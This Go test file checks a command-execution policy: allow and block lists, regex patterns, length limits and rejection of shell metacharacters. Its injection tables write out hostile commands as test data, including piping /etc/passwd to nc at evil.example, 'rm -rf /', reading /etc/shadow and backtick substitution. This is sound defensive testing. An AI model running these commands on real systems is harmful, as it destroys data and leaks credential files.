package execution

import (
	"errors"
	"strings"
	"testing"
)

func mustPolicy(t *testing.T, s CommandPolicySpec) CommandPolicy {
	t.Helper()
	p, err := NewCommandPolicy(s)
	if err != nil {
		t.Fatalf("NewCommandPolicy: %v", err)
	}
	return p
}

func TestPolicyMode_String(t *testing.T) {
	t.Parallel()
	cases := map[PolicyMode]string{
		PolicyNormal:     "normal",
		PolicyStrict:     "strict",
		PolicyPermissive: "permissive",
		PolicyMode(99):   "PolicyMode(99)",
	}
	for m, want := range cases {
		if got := m.String(); got != want {
			t.Errorf("%d.String() = %q, want %q", int(m), got, want)
		}
	}
}

func TestNewCommandPolicy_Defaults(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{})
	if got := p.MaxCommandLength(); got != DefaultMaxCommandLength {
		t.Errorf("MaxCommandLength = %d, want %d", got, DefaultMaxCommandLength)
	}
	if p.AllowsShell() {
		t.Error("AllowsShell should default false")
	}
	if p.Mode() != PolicyNormal {
		t.Errorf("Mode = %v, want PolicyNormal", p.Mode())
	}
}

func TestNewCommandPolicy_BadRegex(t *testing.T) {
	t.Parallel()
	if _, err := NewCommandPolicy(CommandPolicySpec{AllowedPatterns: []string{"["}}); err == nil {
		t.Error("expected error for bad allowed pattern")
	}
	if _, err := NewCommandPolicy(CommandPolicySpec{BlockedPatterns: []string{"("}}); err == nil {
		t.Error("expected error for bad blocked pattern")
	}
}

func TestValidate_NormalEmptyAllowList(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{Mode: PolicyNormal})
	if err := p.Validate(ExecuteRequest{Command: "uptime"}); err != nil {
		t.Errorf("Normal+empty-allow: %v, want nil", err)
	}
}

func TestValidate_StrictEmptyAllowList(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{Mode: PolicyStrict})
	err := p.Validate(ExecuteRequest{Command: "uptime"})
	if !errors.Is(err, ErrCommandNotAllowed) {
		t.Errorf("Strict+empty-allow err = %v, want ErrCommandNotAllowed", err)
	}
	if !strings.Contains(err.Error(), "strict mode") {
		t.Errorf("error %q should mention strict mode", err)
	}
}

func TestValidate_PermissiveIgnoresAllowList(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{
		Mode:            PolicyPermissive,
		AllowedCommands: []string{"only-this"},
	})
	if err := p.Validate(ExecuteRequest{Command: "anything-else"}); err != nil {
		t.Errorf("Permissive: %v, want nil", err)
	}
}

func TestValidate_BlockWinsOverAllow(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{
		AllowedCommands: []string{"rm"},
		BlockedCommands: []string{"rm"},
	})
	err := p.Validate(ExecuteRequest{Command: "rm", Args: []string{"-rf", "/"}})
	if !errors.Is(err, ErrCommandBlocked) {
		t.Errorf("err = %v, want ErrCommandBlocked", err)
	}
}

func TestValidate_AllowedPatternMatch(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{
		Mode:            PolicyStrict,
		AllowedPatterns: []string{`^uptime( -p)?$`},
	})
	if err := p.Validate(ExecuteRequest{Command: "uptime"}); err != nil {
		t.Errorf("uptime: %v, want nil", err)
	}
	if err := p.Validate(ExecuteRequest{Command: "uptime", Args: []string{"-p"}}); err != nil {
		t.Errorf("uptime -p: %v, want nil", err)
	}
	err := p.Validate(ExecuteRequest{Command: "uptime", Args: []string{"-q"}})
	if !errors.Is(err, ErrCommandNotAllowed) {
		t.Errorf("uptime -q err = %v, want ErrCommandNotAllowed", err)
	}
}

func TestValidate_BlockedPatternRegex(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{
		Mode:            PolicyNormal,
		BlockedPatterns: []string{`/etc/shadow`},
	})
	err := p.Validate(ExecuteRequest{Command: "cat", Args: []string{"/etc/shadow"}})
	if !errors.Is(err, ErrCommandBlocked) {
		t.Errorf("cat /etc/shadow err = %v, want ErrCommandBlocked", err)
	}
}

func TestValidate_LengthLimit(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{MaxCommandLength: 10})
	if err := p.Validate(ExecuteRequest{Command: "ok"}); err != nil {
		t.Errorf("short command: %v, want nil", err)
	}
	err := p.Validate(ExecuteRequest{Command: "way", Args: []string{"too", "many", "letters"}})
	if !errors.Is(err, ErrCommandTooLong) {
		t.Errorf("err = %v, want ErrCommandTooLong", err)
	}
}

func TestValidateNoShell_BlocksMetacharacters(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{Mode: PolicyNormal})

	cases := []struct {
		name string
		req  ExecuteRequest
	}{
		{"semicolon chain in args", ExecuteRequest{Command: "uptime", Args: []string{";", "rm"}}},
		{"semicolon chain in command", ExecuteRequest{Command: "uptime;rm"}},
		{"pipe to nc", ExecuteRequest{Command: "cat", Args: []string{"/etc/passwd", "|", "nc"}}},
		{"backtick subst", ExecuteRequest{Command: "echo", Args: []string{"`whoami`"}}},
		{"ampersand chain", ExecuteRequest{Command: "ls", Args: []string{"&&", "rm"}}},
		{"backgrounding", ExecuteRequest{Command: "long-task", Args: []string{"&"}}},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := p.ValidateNoShell(tc.req)
			if !errors.Is(err, ErrShellMetachar) {
				t.Errorf("err = %v, want ErrShellMetachar", err)
			}
		})
	}
}

func TestValidate_AllowsMetacharsInShellMode(t *testing.T) {
	t.Parallel()
	// Validate (the shell-mode variant) does NOT block metachars —
	// shell-wrapped commands legitimately contain them.
	p := mustPolicy(t, CommandPolicySpec{Mode: PolicyNormal})
	cases := []ExecuteRequest{
		{Command: "uptime", Args: []string{";", "date"}},
		{Command: "ls", Args: []string{"|", "wc", "-l"}},
	}
	for _, req := range cases {
		if err := p.Validate(req); err != nil {
			t.Errorf("Validate(%q %v): %v, want nil (shell mode permits metachars)", req.Command, req.Args, err)
		}
	}
}

func TestValidateNoShell_PassesCleanCommand(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{Mode: PolicyNormal})
	if err := p.ValidateNoShell(ExecuteRequest{Command: "uptime", Args: []string{"-p"}}); err != nil {
		t.Errorf("clean command: %v, want nil", err)
	}
}

func TestValidateNoShell_RespectsAllowList(t *testing.T) {
	t.Parallel()
	// Underlying Validate rejects, ValidateNoShell propagates it
	// before checking metachars.
	p := mustPolicy(t, CommandPolicySpec{
		Mode:            PolicyStrict,
		AllowedCommands: []string{"uptime"},
	})
	err := p.ValidateNoShell(ExecuteRequest{Command: "rm"})
	if !errors.Is(err, ErrCommandNotAllowed) {
		t.Errorf("err = %v, want ErrCommandNotAllowed", err)
	}
}

// Injection-attempt sanity table.
func TestValidateNoShell_InjectionAttempts(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{Mode: PolicyNormal})

	cases := []ExecuteRequest{
		{Command: "uptime; rm -rf /"},
		{Command: "cat /etc/passwd | nc evil.example 4444"},
		{Command: "echo `id`"},
		{Command: "ls && rm -rf /tmp"},
	}
	for _, req := range cases {
		err := p.ValidateNoShell(req)
		if !errors.Is(err, ErrShellMetachar) {
			t.Errorf("%q: err = %v, want ErrShellMetachar", req.Command, err)
		}
	}
}

func TestAllowsShell(t *testing.T) {
	t.Parallel()
	p := mustPolicy(t, CommandPolicySpec{AllowShellExecution: true})
	if !p.AllowsShell() {
		t.Error("AllowsShell = false, want true")
	}
	q := mustPolicy(t, CommandPolicySpec{})
	if q.AllowsShell() {
		t.Error("AllowsShell default = true, want false")
	}
}
